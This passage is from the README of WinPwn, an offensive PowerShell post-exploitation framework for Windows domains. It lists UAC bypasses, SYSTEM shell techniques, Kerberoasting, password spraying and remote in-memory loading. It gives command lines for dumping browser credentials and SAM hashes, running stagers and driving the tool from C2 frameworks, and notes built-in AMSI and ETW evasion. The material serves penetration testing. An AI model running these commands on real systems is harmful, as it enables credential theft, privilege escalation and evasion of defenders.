-&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;UAC Magic, Based on James Forshaw&#39;s three part post on UAC&lt;/li&gt; &#xA;   &lt;li&gt;UAC Bypass cmstp technique, by Oddvar Moe&lt;/li&gt; &#xA;   &lt;li&gt;DiskCleanup UAC Bypass, by James Forshaw&lt;/li&gt; &#xA;   &lt;li&gt;DccwBypassUAC technique, by Ernesto Fernandez and Thomas Vanhoutte&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;SYSTEMShell&lt;/code&gt; -&amp;gt;&lt;/h4&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Pop System Shell using CreateProcess&lt;/li&gt; &#xA;   &lt;li&gt;Pop System Shell using NamedPipe Impersonation&lt;/li&gt; &#xA;   &lt;li&gt;Pop System Shell using Token Manipulation&lt;/li&gt; &#xA;   &lt;li&gt;Bind System Shell using UsoClient DLL load or CreateProcess&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Shareenumeration&lt;/code&gt; -&amp;gt; Invoke-Filefinder and Invoke-Sharefinder (Powerview / Powersploit)&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Domainshares&lt;/code&gt; -&amp;gt; Snaffler or Passhunt search over all domain systems&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Groupsearch&lt;/code&gt; -&amp;gt; Get-DomainGPOUserLocalGroupMapping - find Systems where you have Admin-access or RDP access to via Group Policy Mapping (Powerview / Powersploit)&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Kerberoasting&lt;/code&gt; -&amp;gt; Executes Invoke-Kerberoast in a new window and stores the hashes for later cracking&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;PowerSQL&lt;/code&gt; -&amp;gt; SQL Server discovery, Check access with current user, Audit for default credentials + UNCPath Injection Attacks&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Sharphound&lt;/code&gt; -&amp;gt; Bloodhound 3.0 Report&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Adidnsmenu&lt;/code&gt; -&amp;gt; Create Active Directory-Integrated DNS Nodes or remove them&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;MS17-10&lt;/code&gt; -&amp;gt; Scan active windows Servers in the domain or all systems for MS17-10 (Eternalblue) vulnerability&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Sharpcradle&lt;/code&gt; -&amp;gt; Load C# Files from a remote Webserver to RAM&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;DomainPassSpray&lt;/code&gt; -&amp;gt; DomainPasswordSpray Attacks, one password for all domain users&lt;/h4&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;h4&gt;&lt;code&gt;Bluekeep&lt;/code&gt; -&amp;gt; Bluekeep Scanner for domain systems&lt;/h4&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Without parameters, most of the functions can only be used from an interactive shell. So i decided to add the parameters &lt;code&gt;-noninteractive&lt;/code&gt; and &lt;code&gt;-consoleoutput&lt;/code&gt; to make the script usable from an asynchronous C2-Framework like Empire, Covenant, Cobalt Strike or others. Additionally the &lt;code&gt;-repo&lt;/code&gt; parameter was added to use WinPwn with all its features from a local repository. They can be used as follows:&lt;/p&gt; &#xA;&lt;p&gt;Usage:&lt;/p&gt; &#xA;&lt;p&gt;-noninteractive -&amp;gt; No questions for functions so that they run with predefined or user defined parameters&lt;/p&gt; &#xA;&lt;p&gt;-consoleoutput -&amp;gt; The loot/report folders are not created. Every function returns the output to the console so that you can take a look at everything in the Agent logs of your C2-Framework Examples:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;WinPwn -noninteractive -consoleoutput -DomainRecon&lt;/code&gt; -&amp;gt; This will return every single domain recon script and function and will probably give you really much output&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;WinPwn -noninteractive -consoleoutput -Localrecon&lt;/code&gt; -&amp;gt; This will enumerate as much information for the local system as possible&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Generalrecon -noninteractive&lt;/code&gt; -&amp;gt; Execute basic local recon functions and store the output in the corresponding folders&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;UACBypass -noninteractive -command &#34;C:\temp\stager.exe&#34; -technique ccmstp&lt;/code&gt; -&amp;gt; Execute a stager in a high integrity process from a low privileged session&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Kittielocal -noninteractive -consoleoutput -browsercredentials&lt;/code&gt; -&amp;gt; Dump Browser-Credentials via Sharpweb returning the output to console&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Kittielocal -noninteractive -browsercredentials&lt;/code&gt; -&amp;gt; Dump SAM File NTLM-Hashes and store the output in a file&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;WinPwn -PowerSharpPack -consoleoutput -noninteractive&lt;/code&gt; -&amp;gt; Execute Seatbelt, PowerUp, Watson and more C# binaries in memory&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Dotnetsearch -consoleoutput -noninteractive&lt;/code&gt; -&amp;gt; Search in &lt;code&gt;C:\Program Files\&lt;/code&gt; and &lt;code&gt;C:\Program Files (x86)\&lt;/code&gt; for .NET assemblies&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;WinPwn -repo http://192.168.1.10:8000/WinPwn_Repo&lt;/code&gt; -&amp;gt; Use a local webserver as offline repo to use WinPwn without internet access&lt;/p&gt; &#xA;&lt;p&gt;Get_WinPwn_Repo.sh:&lt;/p&gt; &#xA;&lt;p&gt;Usage: ./Get_WinPwn_Repo.sh {Option}&lt;/p&gt; &#xA;&lt;p&gt;Example: ./Get_WinPwn_Repo.sh --install&lt;/p&gt; &#xA;&lt;p&gt;Options: --install Download the repository and place it to ./WinPwn_Repo/ --remove Remove the repository ./WinPwn_Repo/ --reinstall Remove the repository and download a new one to ./WinPwn_Repo/ --start-server Start a python HTTP server on port 8000 --help Show this help&lt;/p&gt; &#xA;&lt;h2&gt;TO-DO&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Some obfuskation&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; More obfuscation&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Proxy via PAC-File support&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Get the scripts from my own creds repository (&lt;a href=&#34;https://github.com/S3cur3Th1sSh1t/Creds&#34;&gt;https://github.com/S3cur3Th1sSh1t/Creds&lt;/a&gt;) to be independent from changes in the original repositories&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; More Recon/Exploitation functions&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Add menu for better handling of functions&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Amsi Bypass&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Block ETW&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;CREDITS&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/Kevin-Robertson/&#34;&gt;Kevin-Robertson&lt;/a&gt; - Inveigh, Powermad, Invoke-TheHash&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/Arvanaghi/&#34;&gt;Arvanaghi&lt;/a&gt; - SessionGopher&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/PowerShellMafia/&#34;&gt;PowerShellMafia&lt;/a&gt; - Powersploit&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/Dionach/&#34;&gt;Dionach&lt;/a&gt; - PassHunt&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/A-mIn3/&#34;&gt;A-mIn3&lt;/a&gt; - WINSpect&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/411Hall/&#34;&gt;411Hall&lt;/a&gt; - JAWS&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/sense-of-security/&#34;&gt;sense-of-security&lt;/a&gt; - ADrecon&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/dafthack/&#34;&gt;dafthack&lt;/a&gt; - DomainPasswordSpray&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/rasta-mouse/&#34;&gt;rasta-mouse&lt;/a&gt; - Sherlock, Amsi Bypass, PPID Spoof &amp;amp; BlockDLLs&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/AlessandroZ/&#34;&gt;AlessandroZ&lt;/a&gt; - LaZagne&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/samratashok/&#34;&gt;samratashok&lt;/a&gt; - nishang&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/leechristensen/&#34;&gt;leechristensen&lt;/a&gt; - Random Repo, Spoolsample, other ps1 scripts&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/HarmJ0y&#34;&gt;HarmJ0y&lt;/a&gt; - Many good Blogposts, Gists and Scripts, all Ghostpack binaries&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/NetSPI/&#34;&gt;NETSPI&lt;/a&gt; - PowerUpSQL&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/Cn33liz/&#34;&gt;Cn33liz&lt;/a&gt; - p0wnedShell&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/rasta-mouse/&#34;&gt;rasta-mouse&lt;/a&gt; - AmsiScanBufferBypass&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/l0ss/&#34;&gt;l0ss&lt;/a&gt; - Grouper2&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/dafthack/&#34;&gt;dafthack&lt;/a&gt; - DomainPasswordSpray&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/enjoiz/Privesc&#34;&gt;enjoiz&lt;/a&gt; - PrivEsc&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/itm4n&#34;&gt;itm4n&lt;/a&gt; - Invoke-PrivescCheck &amp;amp; PrintSpoofer&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/tyranid&#34;&gt;James Forshaw&lt;/a&gt; - UACBypasses&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/api0cradle&#34;&gt;Oddvar Moe&lt;/a&gt; - UACBypass&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS&#34;&gt;Carlos Polop&lt;/a&gt; - winPEAS&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/gentilkiwi&#34;&gt;gentilkiwi&lt;/a&gt; - Mimikatz, Kekeo&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/hlldz&#34;&gt;hlldz&lt;/a&gt; - Invoke-Phantom&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/mattifestation&#34;&gt;Matthew Graeber&lt;/a&gt; - many Ps1 Scripts which are nearly used everywhere&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/rvrsh3ll/&#34;&gt;Steve Borosh&lt;/a&gt; - Misc-Powershell-Scripts, SharpPrinter, SharpSSDP&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://twitter.com/PyroTek3&#34;&gt;Sean Metcalf&lt;/a&gt; - SPN-Scan + many usefull articles @adsecurity.org&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/SnaffCon/Snaffler&#34;&gt;@l0ss and @Sh3r4&lt;/a&gt; - Snaffler&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/FSecureLABS&#34;&gt;FSecureLABS&lt;/a&gt; - GPO Tools&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/vletoux&#34;&gt;vletoux&lt;/a&gt; - PingCastle Scanners&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/BC-SECURITY/Invoke-ZeroLogon&#34;&gt;NCCGroup + BC-Security&lt;/a&gt; - ZeroLogon Scanner&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/BloodHoundAD&#34;&gt;All people working on Bloodhound&lt;/a&gt; - SharpHound Collector&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/klezVirus&#34;&gt;klezVirus&lt;/a&gt; - SharpLdapRelayScan&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/cube0x0&#34;&gt;cube0x0&lt;/a&gt; - LdapSignCheck + other toolings&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://twitter.com/s4ntiago_p&#34;&gt;@s4ntiago_p&lt;/a&gt; - NanoDump&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://twitter.com/thefLinkk&#34;&gt;@thefLinkk&lt;/a&gt; - Handlekatz&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; &lt;a href=&#34;https://github.com/search?q=infosec&#34;&gt;Many more people in the Community&lt;/a&gt; - I&#39;m sure, that I&#39;ve forgotten many other invididuals who indirectly contributed into this Script&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Stargazers over time&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://starchart.cc/S3cur3Th1sSh1t/WinPwn&#34;&gt;&lt;img src=&#34;https://starchart.cc/S3cur3Th1sSh1t/WinPwn.svg?sanitize=true&#34; alt=&#34;Stargazers over time&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Legal disclaimer:&lt;/h2&gt; &#xA;&lt;p&gt;Usage of WinPwn for attacking targets without prior mutual consent is illegal. It&#39;s the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.&lt;/p&gt;</summary>
  </entry>
</feed>